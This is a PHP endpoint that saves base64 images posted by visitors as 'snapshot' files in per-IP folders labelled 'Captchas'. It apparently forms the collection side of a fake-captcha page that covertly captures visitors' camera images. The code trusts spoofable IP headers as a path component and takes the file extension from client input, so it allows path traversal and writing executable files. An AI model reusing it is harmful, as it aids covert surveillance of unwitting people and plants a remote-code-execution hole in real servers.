<?php
header('Content-Type: application/json');

function getUserIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip = getUserIP();
if ($ip === '127.0.0.1') {
    $ip = 'Localhost';
}

$baseDir = __DIR__ . '/../../Data';
$folderPath = $baseDir . '/' . $ip . '/Captchas/';

if (!is_dir($folderPath)) {
    if (!mkdir($folderPath, 0777, true)) {
        echo json_encode(["status" => "error", "message" => "Failed to create folder."]);
        exit;
    }
}

if (empty($_POST['image'])) {
    echo json_encode(["status" => "error", "message" => "No snapshot data received."]);
    exit;
}

$image_parts = explode(";base64,", $_POST['image']);
if (count($image_parts) !== 2) {
    echo json_encode(["status" => "error", "message" => "Invalid snapshot data."]);
    exit;
}

$image_type_aux = explode("image/", $image_parts[0]);
$image_type = !empty($image_type_aux[1]) ? $image_type_aux[1] : 'jpeg';

$image_base64 = base64_decode($image_parts[1], true);
if ($image_base64 === false) {
    echo json_encode(["status" => "error", "message" => "Failed to decode snapshot data."]);
    exit;
}

$file = $folderPath . 'snapshot_' . time() . '.' . $image_type;
if (file_put_contents($file, $image_base64) !== false) {
    echo json_encode(["status" => "success", "message" => "Snapshot saved", "ip" => $ip]);
} else {
    echo json_encode(["status" => "error", "message" => "Snapshot failed"]);
}
?>

